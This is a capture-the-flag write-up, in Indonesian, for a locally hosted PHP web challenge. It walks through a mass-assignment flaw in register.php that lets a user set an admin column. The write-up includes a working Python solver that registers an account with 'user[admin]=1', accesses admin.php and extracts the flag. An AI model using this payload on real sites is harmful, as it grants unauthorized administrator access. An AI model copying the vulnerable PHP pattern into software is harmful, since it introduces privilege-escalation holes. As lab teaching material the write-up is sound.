# WriteUp: Jadi admin

## Overview

* **Judul:** Jadi admin
* **Kategori:** Access Control
* **Poin:** 500
* **Deskripsi:** Bisa ngga ngangkat diri lu jadi admin?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `jadi-admin.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Jadi admin]
└─$ tree
.
├── jadi-admin.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`jadi-admin.yml`):**

```yaml
services:
  oto3-web:
    image: ghcr.io/hengkerrusia/oto3:latest
    ports:
      - "1337:80"
    environment:
      - PWN=${PWN}

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Jadi admin]
└─$ PWN=WanZKey docker compose -f jadi-admin.yml up -d --build
[+] up 13/13
 ✔ Image ghcr.io/hengkerrusia/oto3:latest Pulled                                                                  5.0s
 ✔ Network jadiadmin_default Created                                                                               0.2s
 ✔ Container jadiadmin-oto3-web-1 Created                                                                          0.2s

```

### 2. Source Code Analysis (White Box)

Melakukan inspeksi mendalam pada file `register.php` dan `db.php` di dalam container.

**Analisis `db.php`:**

```php
$query = "CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    password TEXT,
    admin INTEGER DEFAULT 0  // Kolom target
)";

```

**Analisis `register.php` (Vulnerable):**

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user'])) {
    $userData = $_POST['user']; // 1. Mengambil input array 'user'

    // ... (Validasi username/password kosong) ...

    $columns = [];
    $values = [];

    // 2. Vulnerability: Mass Assignment via Nested Parameters
    // Loop ini mengambil KEY dari array $userData dan menjadikannya nama KOLOM database
    foreach ($userData as $key => $value) {
        $columns[] = $key; 
        $values[] = $value;
    }

    // 3. Query Construction
    $sql = "INSERT INTO users (" . implode(', ', $columns) . ") VALUES (" . implode(', ', $placeholders) . ")";
    // ...
}

```

**Identifikasi Celah:**
Aplikasi menggunakan **Nested Mass Assignment**. Input form HTML menggunakan format array `name="user[username]"`. Pada sisi server, kode PHP melakukan iterasi pada array `$_POST['user']` dan secara buta menggunakan *key* array tersebut sebagai nama kolom SQL.
Penyerang dapat menyisipkan *key* `admin` ke dalam array `user` (misal: `user[admin]=1`) untuk memanipulasi kolom `admin` di database, yang seharusnya bernilai default `0`.

### 3. Exploitation

Skenario serangan:

1. Mengirimkan POST request ke `/register.php`.
2. Menggunakan payload array: `user[username]`, `user[password]`, dan **`user[admin]=1`**.
3. Server akan mengeksekusi: `INSERT INTO users (username, password, admin) VALUES (..., ..., 1)`.
4. Login dengan akun tersebut untuk mengakses `admin.php`.

## Script Solver

Script Python untuk melakukan eksploitasi otomatis.

**File:** `exploit.py`

```python
import requests
import random
import string
import re

# Target URL (Port 1337)
URL = "http://localhost:1337"

def exploit():
    s = requests.Session()
    
    # 1. Generate Random User
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    password = "password123"
    print(f"[*] Target: {URL}")
    print(f"[*] Attempting Nested Mass Assignment as: {username}")
    
    # 2. Payload Register (Nested Array Injection)
    # Menambahkan 'user[admin]' untuk privilege escalation
    payload = {
        'user[username]': username,
        'user[password]': password,
        'user[admin]': '1' 
    }
    
    try:
        # Register
        r = s.post(f"{URL}/register.php", data=payload)
        
        # 3. Login
        print("[*] Logging in...")
        s.post(f"{URL}/auth.php", data={
            'username': username,
            'password': password
        })
        
        # 4. Access Admin Page
        r = s.get(f"{URL}/admin.php")
        
        if r.status_code == 200:
            print("[+] Admin Page Accessed!")
            
            if "Administrative Access Granted" in r.text:
                print("[+] Admin Privileges Confirmed!")
                
                # Extract Flag
                flag = re.search(r'pwn\{.*?\}', r.text)
                if flag:
                    print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
                else:
                    print("[-] Flag regex failed.")
            else:
                print("[-] Login success but not Admin.")
        else:
            print(f"[-] Access Failed. Status: {r.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Jadi admin]
└─$ python3 exploit.py
[*] Target: http://localhost:1337
[*] Attempting Nested Mass Assignment as: baesciur
[*] Logging in...
[+] Admin Page Accessed!
[+] Admin Privileges Confirmed!

[!!!] FLAG FOUND: pwn{b738ed9f488f50592ec000a22767f55a}

```

## Flag

```
pwn{b738ed9f488f50592ec000a22767f55a}

```
